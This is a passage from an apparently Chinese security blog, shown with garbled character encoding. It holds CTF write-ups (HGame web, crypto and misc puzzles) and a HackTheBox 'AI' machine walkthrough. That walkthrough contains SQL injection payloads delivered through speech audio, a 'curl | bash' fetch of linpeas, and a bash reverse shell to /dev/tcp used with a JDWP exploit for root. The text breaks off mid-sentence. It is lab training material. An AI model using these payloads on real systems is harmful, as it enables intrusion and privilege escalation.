å¤´ï¼ŒåŠ ä¸Šcosmoså³å¯ã€‚flagè¦åœ¨2077åæ›´æ–°ï¼Ÿä¸€çœ‹åˆ°2077æˆ‘å°±æƒ³åˆ°å»å¹´æ–°æ‰‹ä¸Šåœºçš„ä¸­ç§‘å¤§hackergameé‡Œçš„ä¿¡æ¯å®‰å…¨2077ï¼Œé‚£é“é¢˜å°±æ˜¯é€šè¿‡æ”¹headerä¸­ä¸€ä¸ªå±æ€§æ¥æ‹¿flagã€‚è¿™é“é¢˜åº”è¯¥ä¹Ÿä¸€æ ·å§â€¦â€¦é‚£ä¹ˆæˆ‘ä»¬è¦æ”¹ä»€ä¹ˆå±æ€§å‘¢ï¼Ÿå…ˆæ¥çœ‹çœ‹response:æ³¨æ„åˆ°æœ‰Last-Moifiedè¿™ä¸€å±æ€§ï¼Œè€Œrequestsçš„è¯·æ±‚å¤´ä¸­ä¸ä¹‹å¯¹åº”çš„å°±æ˜¯If-Unmodifed-Since,å…¶å®˜æ–¹è§£é‡Š HTTPåè®®ä¸­çš„ If-Unmodified-Since æ¶ˆæ¯å¤´ç”¨äºè¯·æ±‚ä¹‹ä¸­ï¼Œä½¿å¾—å½“å‰è¯·æ±‚æˆä¸ºæ¡ä»¶å¼è¯·æ±‚ï¼šåªæœ‰å½“èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åæ²¡æœ‰è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ‰ä¼šè¿”å›è¯·æ±‚çš„èµ„æºï¼Œæˆ–æ˜¯æ¥å— POST æˆ–å…¶ä»– non-safe æ–¹æ³•çš„è¯·æ±‚ã€‚å¦‚æœæ‰€è¯·æ±‚çš„èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åå‘ç”Ÿäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆä¼šè¿”å› 412 (Precondition Failed) é”™è¯¯ã€‚ æ‰€ä»¥æ”¹å¥½æ—¶é—´åœ¨2077ä¹‹åï¼š code world è¿™é“é¢˜åšå‡ºæ¥çš„äººæ•°ç®—æ˜¯æ‰€æœ‰webé‡Œé¢æœ€å°‘çš„äº†,ä½†æ˜¯è‡ªå·±ä¸€å¼€å§‹å‚»å‚»çš„å¡äº†å¥½ä¹…â€¦â€¦ å¼€å§‹ä¸€ä¸ª403,ä¸è¿‡ä½œä¸ºctfer,åƒä¸‡ä¸è¦ç›¸ä¿¡è¿™ä¸ª403æ˜¯çœŸæ­£çš„403ï¼Œé‚£ä¹ˆå…ˆæŠ“ä¸ªåŒ…ï¼Œæœä¸å…¶ç„¶æç¤ºå­˜åœ¨302ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—®index.phpå§ï¼ŒæŠ“åŒ…åå‘è‡³repeaterå‘ç°å­˜åœ¨405,é‚£ä¹ˆæœæ–­æ”¹æˆPOSTè¯·æ±‚æ–¹å¼ï¼Œå¾—åˆ°ï¼š é‚£ä¹ˆæç¤ºé€šè¿‡urlä¼ å€¼ï¼Œé‚£æœæ–­ä¼ /?a=5+5å•Šï¼Œç»“æœè¿”å›è¯´â€œå†æƒ³æƒ³â€ã€‚è‡ªå·±é¡¿æ—¶é™·å…¥è¿·èŒ«ï¼Œä¸€å¼€å§‹æƒ³æ˜¯ä¸æ˜¯ä¸æ˜¯ç”¨+è¿æ¥ï¼Œåæ¥åˆæƒ³ï¼ŒåŸºäºé¢˜ç›®æ˜¯codeworldï¼Œæ˜¯ä¸æ˜¯è¦ä»£ç æ‰§è¡Œ?ä½†æ˜¯fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶æ²¡æœ‰å›æ˜¾æ‰§è¡Œçš„ç‚¹ã€‚äºæ˜¯é™·å…¥è¿·èŒ«ã€‚åæ¥ï¼Œè‡ªå·±åœ¨æ£€æŸ¥è‡ªå·±æŠ“çš„åŒ…æ—¶ï¼Œæ„å¤–å‘ç°äº†ä¸€ç‚¹ï¼šå¯¹äº†ï¼åœ¨è¿›è¡Œgetä¼ å€¼æ—¶ï¼Œä»–ä¼šæŠŠåŠ å·å¤„ç†æˆç©ºã€‚ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œé¢˜ç›®æ‰ä¼šè¦æ±‚urlä¼ å€¼å¹¶ä½¿ç”¨ç›¸åŠ è¿™ç§æ–¹å¼æ¥è®¾ç½®é™å®šã€‚æ‰€ä»¥payloadå³ä¸º 1&#x2F;?a&#x3D;5%2B5 ğŸ”å°¼æ³°ç«æ¸¸æˆé¢˜hhhä½†ä»æ¸¸æˆè§’åº¦è¿‡åˆ†éš¾äº†ã€‚æ˜¾ç„¶æ¸¸æˆåªæ˜¯å¹Œå­ï¼Œåº”è¯¥æ‰¾åˆ°ç½‘ç«™é‡Œèƒ½postå€¼çš„æ“ä½œï¼Œäºæ˜¯å°è¯•ç‹‚ç‚¹â€˜å¼€å§‹æ¸¸æˆâ€™ï¼Œæœç„¶æç¤ºéœ€è¦300000åˆ†æ—¶æŠ“åˆ°poståŒ…ã€‚æ”¹åŒ…å°±å¥½ã€‚ CryptoInfantRSAæœ‰ç”Ÿä¹‹å¹´è¿˜èƒ½åšå‡ºRSAâ€¦â€¦å› ä¸ºçœ‹åˆ°RSAå‡ ä¸ªå‚æ•°æç¤ºçš„å¾ˆæ¸…æ¥šå°±å¹²è„†å»ç½‘ä¸Šå«–è„šæœ¬äº†ã€‚åœ¨è£…åº“çš„æ—¶å€™å°±å¾ˆæ— å¥ˆï¼Œgmpy2æ€»æ˜¯å¼„ä¸å¥½ã€‚æœ€åå»æ‰¾äº†ä¸ªwhlï¼Œpip installä¸‹æ€»å½’èƒ½ç”¨äº† 12345678910111213141516import gmpy2import binasciip = gmpy2.mpz(681782737450022065655472455411)q = gmpy2.mpz(675274897132088253519831953441)e = gmpy2.mpz(13)phi_n = (p-1)*(q-1)d = gmpy2.invert(e, phi_n)c = gmpy2.mpz(275698465082361070145173688411496311542172902608559859019841)m = pow(c, d, p*q)print(\"åè¿›åˆ¶:\\n%s\"%m)m_hex = hex(m)[2:]print(\"åå…­è¿›åˆ¶:\\n%s\"%(m_hex,))#print(\"ascII:\\n%s\"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))print(\"ascii:\\n%s\"%(binascii.a2b_hex(m_hex).decode(\"utf8\"),)) miscæ¬¢è¿å‚åŠ HGameï¼1Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t ä¸€å¼€å§‹ä¸å¤ªæ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆç¼–ç ï¼Œåæ¥ç™¾åº¦ä¸€ä¸‹å‘ç°å°±æ˜¯base64ã€‚å›å¤´æƒ³æƒ³ï¼Œå‘ç°æ¯•ç«Ÿæ˜¯æ•°å­—+å­—æ¯çš„ç»„åˆï¼Œå¯ä»¥è€ƒè™‘baseç³»çš„ç¼–ç ã€‚è§£ç åä¸ºmorseç”µç ï¼Œåœ¨çº¿è§£ä¸€ä¸‹å°±å¥½äº†ã€‚ å£çº¸é¢˜ç›®ä¸‹ä¸‹æ¥æ‰“å¼€æ˜¯ä¸ªå›¾ç‰‡ï¼Œæ‰”winhexé‡Œçœ‹å‘ç°æœ«å°¾æç¤ºflag.txtä»¥åŠå¯†ç æ˜¯å›¾ç‰‡idï¼Œå›¾ç‰‡ååˆ™æ ‡æ³¨äº†pixivã€‚ã€‚ã€‚ä¼°è®¡æ˜¯è¦æ”¹æˆå‹ç¼©åŒ…äº†ï¼Œæ‰€ä»¥ä¹Ÿæ²¡å»çœ‹æœ‰æ²¡æœ‰å‹ç¼©åŒ…æ–‡ä»¶ï¼Œå¤´å°±ç›´æ¥æ”¹zipï¼Œæœä¸å…¶ç„¶æ˜¯å‹ç¼©åŒ…ï¼Œå†…å®¹ä¸ºflag.txtï¼Œéœ€è¦å¯†ç ã€‚é‚£å°±ç›´æ¥ä¸Špç«™æ‰¾è¿™ä¸ªç”»å¸ˆå§ï¼ˆæ„Ÿè§‰åƒäº†ä¸€æ³¢å¼ºè¡Œå®‰åˆ©å•Šï¼‰æ‰¾åˆ°å›¾ç‰‡åç”¨å¯†ç çœ‹flag.txtï¼Œæœ€åç»“æœasciiè§£ç ä¸€ä¸‹å°±å¥½ã€‚ ç­¾åˆ°é¢˜ProPlusä¸€æ—¶å…´èµ·è¿˜æ˜¯çœ‹äº†çœ‹è¿™é“miscã€‚ä¸Šæ¥å…ˆç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ 123456Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fenses first, Five Caesar next. English sentense first, zip password next. çœ‹åˆ°fencesè·Ÿceaserå°±æƒ³åˆ°äº†æ …æ è·Ÿå‡¯æ’’å¯†ç äº†ã€‚åŠ ä¸Šæç¤ºå…ˆ3æ …æ ï¼Œå†5å‡¯æ’’ï¼Œé‚£ä¹ˆåœ¨çº¿è§£ä¸‹ç ï¼Œå¯¹åº”ç»„æ•°ä¸åç§»æ•°åˆ†åˆ«ä¸º3,5å³å¯ã€‚è§£å‡ºæ¥å‰é¢ä¸€å¥è¯å¦‚ä¸‹ï¼šMany years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.å‡ºè‡ªç™¾å¹´å­¤ç‹¬ï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚è§£å‡ºçš„å¯†ç ç”¨æ¥è§£å‹åŠ å¯†çš„å‹ç¼©åŒ…ï¼Œå¾—åˆ°æ–‡æ¡£ 1234data:text;ook,Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook............. æœ‰ç‚¹æ‘¸ä¸ç€å¤´è„‘ï¼Œäºæ˜¯è°·æ­Œä¸€ä¸‹ï¼Œå‘ç°è¿™æ˜¯å±äºbrainfuckç¼–ç ä¸­çš„ä¸€ç§ï¼Œä¸ç¦è®©æˆ‘è”æƒ³åˆ°äº†åŸæ¥ä¼¤çœ¼ç›çš„jsfuckç¼–ç â€¦â€¦é‚£ä¹ˆåœ¨çº¿è§£ç ä¸€ä¸‹ï¼ˆæ‰¾ä¸ªå¥½ç‚¹çš„ç½‘ç«™ï¼Œå¼€å§‹æˆ‘æ‰¾çš„ç½‘ç«™åªè§£äº†ä¸€éƒ¨åˆ†ï¼‰ï¼Œå¾—åˆ°base32ç¼–ç ã€‚å†base32è§£ç ï¼Œå‘ç°å¾—åˆ°çš„ç»“æœå¯ä»¥è¿›è¡Œbase64è§£ç ï¼Œä¸”ç»“æœå¼€å¤´æœ‰å›¾ç‰‡çš„æ–‡ä»¶å¤´ã€‚é‚£ä¹ˆå¯ä»¥ç¡®è®¤æ˜¯å›¾ç‰‡æ–‡ä»¶å†…å®¹è¿›è¡Œäº†base64ç¼–ç ã€‚é‚£ç›´æ¥è§£å‡ºæ–‡ä»¶å°±å¥½äº†ï¼ˆå¯ä»¥ç”¨pythonï¼Œä¹Ÿå¯ä»¥åœ¨çº¿ï¼‰ã€‚å¾—åˆ°äºŒç»´ç ï¼Œç›´æ¥æ‰«ç å¾—flagã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"hackthebox-AIâ€”â€”æœ‰è¶£çš„sql+JDWPgetshell","slug":"hackthebox-AIâ€”â€”æœ‰è¶£çš„sql-JDWPgetshell","date":"2020-01-29T05:37:43.000Z","updated":"2021-02-18T05:09:10.736Z","comments":true,"path":"2020/01/29/hackthebox-AIâ€”â€”æœ‰è¶£çš„sql-JDWPgetshell/","link":"","permalink":"https://www.bycsec.top/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/","excerpt":"ç»ˆäºåˆç­‰åˆ°hacktheboxæ›´æ–°é€€å½¹é¶æœºäº†ï¼Œè¿™æ¬¡çš„é¶æœºæ˜¯AIã€‚å› ä¸ºæ¯”è¾ƒæœ‰æ„æ€æ‰€ä»¥æ¥è®°å½•ä¸‹ã€‚ä¸è¿‡è¿‡ç¨‹å¹¶éä¸€å¸†é£é¡ºã€‚å…¶ä¸­è¿˜é‡åˆ°é¶æœºç£ç›˜å†™æ»¡å¯¼è‡´æ— æ³•å†™å…¥æ–‡ä»¶çš„äº‹ã€‚åˆ äº†åŠå¤©æ‰æƒ³èµ·æ¥è¦é‡è®¾é¶æœºâ€¦â€¦ è·Ÿä¸Šæ¬¡ä¸€æ ·å‚è€ƒäº†ä¸‹å¤§ç¥çš„è§†é¢‘https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391sè§†é¢‘çœŸçš„éå¸¸è‰¯å¿ƒã€‚","text":"ç»ˆäºåˆç­‰åˆ°hacktheboxæ›´æ–°é€€å½¹é¶æœºäº†ï¼Œè¿™æ¬¡çš„é¶æœºæ˜¯AIã€‚å› ä¸ºæ¯”è¾ƒæœ‰æ„æ€æ‰€ä»¥æ¥è®°å½•ä¸‹ã€‚ä¸è¿‡è¿‡ç¨‹å¹¶éä¸€å¸†é£é¡ºã€‚å…¶ä¸­è¿˜é‡åˆ°é¶æœºç£ç›˜å†™æ»¡å¯¼è‡´æ— æ³•å†™å…¥æ–‡ä»¶çš„äº‹ã€‚åˆ äº†åŠå¤©æ‰æƒ³èµ·æ¥è¦é‡è®¾é¶æœºâ€¦â€¦ è·Ÿä¸Šæ¬¡ä¸€æ ·å‚è€ƒäº†ä¸‹å¤§ç¥çš„è§†é¢‘https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391sè§†é¢‘çœŸçš„éå¸¸è‰¯å¿ƒã€‚ (è¿™æ¬¡åšä¹‹å‰æ›´æ–°kaliè™šæ‹Ÿæœº,åˆæŠŠè‡ªå·±çš„è™šæ‹Ÿæœºå¼„æ­»æœºäº†â€¦â€¦å¥½åœ¨ç°åœ¨ä¸é‚£ä¹ˆå®¹æ˜“æ•´ä½“ç‚¸æ‰ï¼Œå€’æ˜¯kaliçš„ç•Œé¢è¶Šæ›´æ–°è¶Šèˆ’é€‚ï¼ŒæŒºä¸é”™çš„) æœ¬æœºip:10.10.15.60 é¶æœºip:10.10.10.163 é¦–å…ˆç¬¬ä¸€æ­¥å½“ç„¶æ˜¯æ¢æµ‹ç«¯å£äº† 1namp -sC -sV -oA ai 10.10.10.163 å‘ç°æœ‰22ä¸80ç«¯å£å¼€æ”¾ã€‚æ—¢ç„¶æœ‰httpæœåŠ¡ï¼Œé‚£å°±å°è¯•ç›´æ¥è®¿é—®å§ã€‚æœ‰ä¸€ä¸ªä¸»é¡µé¢ã€‚åŒæ—¶ä¹Ÿå‘ç°äº†å…¶ä»–phpæ–‡ä»¶ï¼Œå”¯ä¸€æ¯”è¾ƒæœ‰æ„æ€çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ªai.phpé¡µé¢ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ ä½†æ˜¯å¾ˆå¥‡æ€ªã€‚å±…ç„¶æ˜¯.wavfileã€‚é€šå¸¸æˆ‘æ‰€çŸ¥é“çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ä¹Ÿå°±å›¾ç‰‡é©¬æˆ–è€…pharååºåˆ—åŒ–æˆ–è€…å…¶ä»–ç±»å‹çš„getshellã€‚è€Œå®ƒæç¤ºçš„drop your query using wav file.ä¼¼ä¹æ˜¯åœ¨è¯´æ˜æˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŸ¥è¯¢æ“ä½œã€‚ é‚£ä¹ˆé¦–å…ˆéšä¾¿ä¼ ä¸€ä¸ªtest.phpä¸Šå»ã€‚å†…å®¹éšæ„ã€‚å‘ç°æ²¡æœ‰å›æ˜¾ã€‚ çœ‹æ¥æ˜¯è¦wavçš„éŸ³é¢‘æ–‡ä»¶äº†ã€‚ä½¿ç”¨éŸ³é¢‘æ–‡ä»¶æ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿™ç‚¹çœŸçš„éš¾ä»¥å¼„æ‡‚ã€‚é‚£ä¹ˆåœ¨å°è¯•å¼„æ¸…æ¼æ´ç±»å‹ä¹‹å‰å…ˆæ¥ç›®å½•çˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ä¿¡æ¯ï¼š 1gobuster dir -u http:&#x2F;&#x2F;10.10.10.163 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php åŸºäºè¿™é‡Œéƒ½æ˜¯phpï¼Œæˆ‘ä»¬åœ¨gobusteråç€é‡åŠ ä¸Š-x phpè¿›è¡Œç­›é€‰ã€‚è§£æœå¤§è‡´å¦‚ä¸‹ï¼š 12345678&#x2F;index.php (Status: 200)&#x2F;contact.php (Status: 200)&#x2F;about.php (Status: 200)&#x2F;images (Status: 301)&#x2F;uploads (Status: 301)&#x2F;db.php (Status:301)&#x2F;intelligence.php(Status: 200)&#x2F;ai.php(Status: 200) å…¶ä¸­ai.phpç­‰ç­‰éƒ½æ˜¯ä¸»é¡µé¢å°±æä¾›äº†çš„ã€‚æ–°å‘ç°çš„é¡µé¢åŒ…æ‹¬intelligence.phpè·Ÿdb.phpã€‚ä¸Šä¼ è·Ÿå›¾ç‰‡ç•Œé¢æˆ‘ä»¬éƒ½æ²¡æœ‰æƒé™è¿›å»ã€‚é‚£ä¹ˆè®¿é—®ä¸‹å”¯ä¸€å¯ä»¥è®¿é—®çš„intelligence.php å‘ç°äº†è¿™ä¸ªé¡µé¢ã€‚ä¼¼ä¹å­˜åœ¨ç€è¯è¯­çš„æ›¿æ¢å…³ç³»ã€‚ä»è¡¨çš„å³åˆ—ä¸­æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°ä¸€äº›ç†Ÿæ‚‰çš„ç¬¦å·â€“union,#,---,Schemaç­‰ç­‰ã€‚è¿™äº›éƒ½æ˜¯å¸¸å¸¸å‡ºç°åœ¨sqlæ³¨å…¥ä¸­çš„ç¬¦å·ã€‚ç»“åˆæˆ‘ä»¬è¿˜çˆ†ç ´å‡ºäº†db.phpï¼Œå¯ä»¥çŒœæƒ³æ˜¯å¦æœ‰sqlæ³¨å…¥çš„æ¼æ´å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯æ­£ç¡®çš„ã€‚è€Œä¸”è„‘æ´å¤§å¼€çš„æ˜¯ï¼šæˆ‘ä»¬è¦ç”¨è¯­è¨€è½¬æˆéŸ³é¢‘æ–‡ä»¶ä¸Šä¼ æ¥è¿›è¡Œæ³¨å…¥ã€‚è¿™ä¹Ÿè®¸å°±æ˜¯è¿™ä¸ªAIé¶æœºçš„åå­—æ‰€åœ¨å§ã€‚ é¦–å…ˆgoogle linux say commandï¼Œ å‘ç°æœ‰è¿™æ ·çš„ä¸€ä¸ªè½¯ä»¶ã€‚å«åšfestivalã€‚ 1apt-get install festival ä½¿ç”¨å®ƒå…¶ä¸­ä¸€ä¸ªå«text2waveçš„å°±èƒ½å°†è¯­å¥è½¬æˆè¯­éŸ³æ–‡ä»¶ã€‚æ¯”å¦‚ç”¨ä¸‹ç®¡é“ç¬¦ï¼Œç”Ÿæˆä¸€ä¸ªtest.wavï¼Œå†…å®¹ä¸ºhelloã€‚ 1echo &quot;Hello&quot;| text2wave -o test.wav å°è¯•å¬ä¸‹è¿™ä¸ªéŸ³é¢‘ï¼Œå‘ç°æ˜¯ä¸ªç”·ä½éŸ³ï¼ˆä¹Ÿè®¸æ˜¯æœºå™¨åˆæˆéŸ³?ï¼‰ç„¶åå†æ¬¡å°è¯•ä¸Šä¼ å‘ç°inputæœ‰ç»“æœï¼Œé‚£ä¹ˆå°±å°è¯•ä¸‹ç¿»è¯‘æˆè‹±æ–‡æ¥sqlæ³¨å…¥å§ã€‚(è¿™ç‚¹å¯¹éè‹±è¯­æ¯è¯­çš„å›½å®¶çš„äººåº”è¯¥éå¸¸ä¸å‹å¥½â€¦â€¦æ¯•ç«Ÿæœ‰äº›åé—¨çš„æ‹¬å·ä¹‹ç±»çš„è‹±æ–‡æˆ‘ä¹Ÿä¸å¤ªç†Ÿï¼‰ 123( openparenthesis å·¦æ‹¬å·) closeparenthesis å³æ‹¬å·- hyphen è¿å­—ç¬¦ åŸºäºä¸€å¼€å§‹è¿˜æ¢æµ‹åˆ°çš„intelligence.phpä¸­æœ‰äº›å­—ç¬¦å¯¹åº”å…³ç³»ï¼Œä¸éš¾æƒ³åˆ°æˆ‘ä»¬éœ€è¦ä½¿ç”¨é‚£å¼ è¡¨æ¥ç»•è¿‡æ³¨å…¥æ¯”å¦‚æˆ‘çš„å°è¯•payload 1&#39; union select database()--- éœ€è¦æ¢ä½œ 1open single quote, join select , database open parenthesis close parenthesis comment database å†é‡å¤ä¸Šé¢ç”Ÿæˆtest.wavçš„æ“ä½œï¼Œå°±å¯ä»¥ä¸Šä¼ æ³¨å…¥ã€‚ åŸºäºhacktheboxæ˜“å¾—userçš„å°¿æ€§ï¼Œå¯ä»¥çŒœå‡ºä¸€å¼ usersè¡¨ç„¶åçˆ†å‡ºusernameè·Ÿpassword 123&#39;union select username from user---open single quote, join , select , username from users comment databaseopen single quote, join , select , password from users comment database æ˜¾ç„¶ï¼Œæˆ‘ä»¬çš„httpé¡µé¢å¹¶æ²¡æœ‰ä»€ä¹ˆè®©æˆ‘ä»¬ç™»å½•è¿›å»çš„æ–¹æ³•æˆ–é¡µé¢ã€‚åŸºäºä¹‹å‰çš„ç«¯å£æ¢æµ‹å‘ç°æœ‰sshå¼€æ”¾ï¼Œä¸å¦¨å°è¯•sshç™»å½•æˆåŠŸç™»é™†ã€‚å¹¶ä¸”user.txtå°±åœ¨å½“å‰ç›®å½•ä¸‹ã€‚ ä¹‹åå°±æ˜¯å¸¸è§„ææƒçš„è¿‡ç¨‹äº†ã€‚ è¿™é‡Œå¼€å§‹å¯èƒ½ä¼šæƒ³åˆ°ä¹‹å‰æ²¡æˆåŠŸè®¿é—®çš„db.phpï¼Œåœ¨/var/www/htmlä¸­çˆ†å‡ºå†…å®¹å¯çŸ¥usernameä¸ºdbuser,passwordä¸ºtoorè¿›å…¥mysqlå¯ç”¨çš„å°±å¤šäº†ã€‚ï¼ˆç„¶è€Œæˆ‘è¿›å»çš„æ—¶å€™åº“è¢«åˆ«äººåˆ äº†â€¦â€¦ï¼‰å®é™…ä¸Šå¯ä»¥çˆ†å‡ºä¹‹å‰alexaæ‰€åœ¨userè¡¨çš„å†…å®¹ä¸­ 12username:rootpassword:H,Sq9t6&#125;a&lt;)?q931 ä½†æ˜¯sshç™»å½•å¹¶ä¸æˆåŠŸã€‚mysqlè¿™æ¡è·¯èµ°ä¸é€šã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå‘ç°ææƒçš„æ¼æ´ç‚¹å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œå°¤å…¶æ˜¯å¯¹æˆ‘è¿™æ ·çš„å°ç™½è€Œè¨€ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»dalaoè§†é¢‘é‚£å‘ç°äº†ä¸€ä¸ªå¾ˆå‰å®³çš„è„šæœ¬å¯ä»¥è§£å†³æˆ‘è‡ªå·±çš„æ¼æ´è®¤çŸ¥é—®é¢˜ã€‚https://github.com/carlospolop/privilege-escalation-awesome-scripts-suiteåœ¨é¶æœºä¸Šä½¿ç”¨å…¶ä¸­çš„linpeas.shï¼Œè„šæœ¬å°±ä¼šè‡ªåŠ¨åˆ†æå¯èƒ½ææƒçš„æ¼æ´ç‚¹ã€‚ç€å®è§£å†³ä¸å°‘é—®é¢˜ã€‚ä¸è¿‡é€šå¸¸ç»“æœåˆè‡­åˆé•¿ï¼Œå¯èƒ½éœ€è¦è€å¿ƒæ‰¾ä¸€æ‰¾ã€‚å…·ä½“æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæœ¬æœºgit cloneå¥½åï¼Œèµ·ä¸€ä¸ªpythonç›‘å¬ï¼ˆé»˜è®¤8000ç«¯å£ï¼‰ 1python -m SimpleHTTPServer åœ¨é¶æœºä¸Šç›´æ¥curlåæ‰§è¡Œå°±å¥½äº† 1curl 10.10.15.60:8000&#x2F;linpeas.sh | bash è¿™é‡Œä»linpeas.shçš„ç»“æœä¸­å¯ä»¥å‘ç°ä¸€ä¸ªJDWPçš„ç‚¹è¢«æ ‡çº¢äº†ã€‚é‚£ä¹ˆjdwpæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æœç´¢ä¸€ä¸‹ JDWPï¼ˆJava DEbugger Wire Protocolï¼‰ï¼šå³Javaè°ƒè¯•çº¿åè®®ï¼Œæ˜¯ä¸€ä¸ªä¸ºJavaè°ƒè¯•è€Œè®¾è®¡çš„é€šè®¯äº¤äº’åè®®ï¼Œå®ƒå®šä¹‰äº†è°ƒè¯•å™¨å’Œè¢«è°ƒè¯•ç¨‹åºä¹‹é—´ä¼ é€’çš„ä¿¡æ¯çš„æ ¼å¼ã€‚è¯´ç™½äº†å°±æ˜¯JVMæˆ–è€…ç±»JVMçš„è™šæ‹Ÿæœºéƒ½æ”¯æŒä¸€ç§åè®®ï¼Œé€šè¿‡è¯¥åè®®ï¼ŒDebugger ç«¯å¯ä»¥å’Œ target VM é€šä¿¡ï¼Œå¯ä»¥è·å–ç›®æ ‡ VMçš„åŒ…æ‹¬ç±»ã€å¯¹è±¡ã€çº¿ç¨‹ç­‰ä¿¡æ¯ è€Œè¿™æ˜¯æœ‰æ¼æ´åˆ©ç”¨çš„ã€‚æ¯”å¦‚çŸ¥é“åˆ›å®‡ä¸Šçš„https://www.seebug.org/vuldb/ssvid-89216 ç­‰ç­‰ï¼Œéƒ½æ˜¯jdwpçš„ä»£ç æ‰§è¡Œæ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±ç”¨è¿™ä¸ªæ¼æ´ï¼Œå°è¯•æ‹¿åˆ°rootæƒé™ã€‚é¦–å…ˆç¡®å®šä½¿ç”¨çš„å·¥å…·https://github.com/IOActive/jdwp-shellifier shellæ¯”è¾ƒå¥½ã€‚æ‰€ä»¥å…ˆåœ¨alexaçš„é¶æœºçš„tmpç›®å½•ä¸‹æ”¾ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬test.shå†…å®¹å¦‚ä¸‹ï¼š123&#96;&#96;&#96;#!&#x2F;bin&#x2F;bashbash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.60&#x2F;9002 0&gt;&amp;1&#39; ç„¶åç»™å…¶æ‰§è¡Œçš„æƒé™ 1chmod +x test.sh è°ƒç”¨æ—¶åªéœ€ï¼š 1.&#x2F;test.sh å…ˆæœ¬æœºç›‘å¬ä¸‹ï¼Œæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¼¹åˆ°alexaçš„shellã€‚ æ¥ä¸‹æ¥ç”¨åˆ°ä¸€ä¸ªæ–°å­¦åˆ°çš„å¤§æ‹›ï¼šç«¯å£è½¬å‘ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ¯æ¬¡sshç™»å½•è¿™ä¸€é¶æœºéƒ½è¦ç”¨æˆ·å¯†ç ï¼Œååˆ†éº»çƒ¦ã€‚è€Œä¸”å°†è¦åˆ©ç”¨çš„jdwpæ˜¯javaçš„debugåŠŸèƒ½ï¼Œæ®è¯´æ“ä½œæ—¶ååˆ†å®¹æ˜“æ–­å¼€ã€‚é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥æœ¬æœºå¤„ç†è¿™ä¸ªjdwpå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ç«¯å£è½¬å‘ã€‚åŸæœ¬è‡ªå·±ä»¥ä¸ºååˆ†å¤æ‚ï¼Œä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤ã€‚ é¦–å…ˆåœ¨é¶æœºä¸Šç¡®è®¤jdwpæ˜¯è¿è¡Œåœ¨8000ç«¯å£çš„ã€‚é‚£ä¹ˆæˆ‘å…ˆè¿›å…¥tomcatçš„ç›®å½•ï¼ŒæŒ‰ä¸‹~Cå°†ç›´æ¥è¿›å…¥sshï¼Œç„¶åå°†å…¶è½¬åˆ°localhostæ¥ç ”ç©¶ 1-L 8000:localhost:8000 è¿™æ—¶æˆ‘ä»¬åœ¨æœ¬æœºä¸Šä½¿ç”¨ 1ss -lntp æŸ¥çœ‹ä¸»æœºç›‘å¬çš„ç«¯å£ã€‚å°±ä¼šå‘ç°8000ç«¯å£å¤„äºç›‘å¬çŠ¶æ€äº†ï¼Œuseræ˜¯sshã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨åŒæ 